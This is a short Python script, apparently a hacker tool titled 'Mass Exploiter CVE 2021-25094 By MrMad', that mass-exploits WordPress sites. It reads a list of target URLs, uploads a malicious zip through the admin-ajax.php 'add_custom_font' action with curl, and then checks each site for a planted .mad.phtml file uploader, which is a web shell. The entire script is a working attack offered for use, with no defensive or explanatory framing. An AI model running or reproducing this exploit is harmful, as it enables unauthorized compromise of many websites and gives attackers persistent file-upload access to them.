from os import popen
import requests as a
from termcolor import colored as color
import urllib3


# For Disable Warning HTTPS ssl unverify
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("""
_____                 _   _ _   _ ____
|_   _|   _ _ __   ___| | | | | | | __ )
  | || | | | '_ \ / _ \ |_| | | | |  _\\
  | || |_| | |_) |  __/  _  | |_| | |_) |
  |_| \__, | .__/ \___|_| |_|\___/|____/
      |___/|_|
  Mass Exploiter CVE 2021-25094 By MrMad
""")

LIST = input("LIST : ")

with open(LIST, "r") as w:
    baca = w.read()
    expl = baca.split("\n")
    for x in expl:
        popen('curl {}/wp-admin/admin-ajax.php -F "action=add_custom_font" -F "file=@mad_expl.zip" --silent'.format(x))
        try:
            r = a.get(
                "{}/wp-content/uploads/typehub/custom/mad_expl/.mad.phtml".format(x), verify=False)
            if r.status_code == 200 and "File Uploader Private" == r.text:
                print("{}/wp-content/uploads/typehub/custom/mad_expl/.mad.phtml => {}".format(
                    x, color("[200]", "green")))
            elif r.status_code == 403:
                print("{}/wp-content/uploads/typehub/custom/mad_expl/.mad.phtml => {}".format(
                    x, color("[403]", "yellow")))
            elif r.status_code == 404:
                print("{}/wp-content/uploads/typehub/custom/mad_expl/.mad.phtml => {}".format(
                    x, color("[404]", "red")))
        except:
            pass
